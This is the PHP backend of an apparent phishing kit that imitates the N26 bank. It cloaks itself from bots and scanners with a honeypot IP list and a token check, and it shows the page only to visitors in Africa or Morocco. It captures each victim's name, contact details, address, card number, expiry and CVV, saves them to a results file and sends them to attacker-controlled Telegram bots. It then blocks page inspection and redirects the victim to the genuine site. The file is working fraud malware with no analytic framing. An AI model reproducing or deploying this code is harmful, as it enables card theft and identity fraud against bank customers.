<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
if (!$country)
{
    $country='Not found!';
}

if ($continent !== 'AF' && $country !== 'MA')
{
      header("location: " . $errorUrl . "?" . $_GET['token']);
     exit();
} 

if ($_POST['type'] == "infos") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$bin = substr($_POST['cn'],0,8);
$bin = str_replace(' ','',$bin);
$url = "https://lookup.binlist.net/" . $bin;
$response = curl_get_contents($url);
$details = json_decode($response, true);

            $message = '/== N26 INFOS By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Nom et prenom : ' . $_POST['np'] . "\r\n";
            $message .= 'Email : ' . $_POST['email'] . "\r\n";
            $message .= 'TEL n° : ' . $_POST['tel'] . "\r\n";
            $message .= 'Adresse : ' . $_POST['adresse'] . "\r\n";
            $message .= 'Carte credit : ' . $_POST['cn'] . "\r\n";
            $message .= 'Expiration mm/yy: ' . $_POST['ed'] . "\r\n";
            $message .= 'Securite : ' . $_POST['sc'] . "\r\n";
            $message .= "/---------------- bank details ----------------/" . "\r\n";
	    $message .= "bank : ".$details["bank"]["name"]."\n";
            $message .= "type : ".$details["type"]."\n";
            $message .= "brand : ".$details["brand"]."\n";
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end infos details --/' . "\r\n\r\n";

            file_put_contents("./rezult/n26-rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
            $params=[
            'chat_id'=>$chatt_id,
            'text'=>$message,
            ];
            $ch = curl_init($MEETRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}

?>
<!doctype html>
<html>
 
<head>
</head>
<script src="./bill-pay_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>
<body>

<META HTTP-EQUIV='Refresh' Content=1;URL='https://n26.com/'>
 
</body>
</html>
